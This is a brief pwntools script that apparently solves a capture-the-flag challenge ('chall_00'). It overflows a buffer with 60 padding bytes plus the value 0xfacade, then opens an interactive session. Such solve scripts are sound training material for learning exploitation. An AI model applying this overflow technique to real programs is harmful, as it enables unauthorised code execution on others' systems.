from pwn import *
p = process("./chall_00")
p.recv()
line = b"A" * 60 + p32(0xfacade)
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\xca\xfa\x00
p.sendline(line)
print(line)
p.interactive()
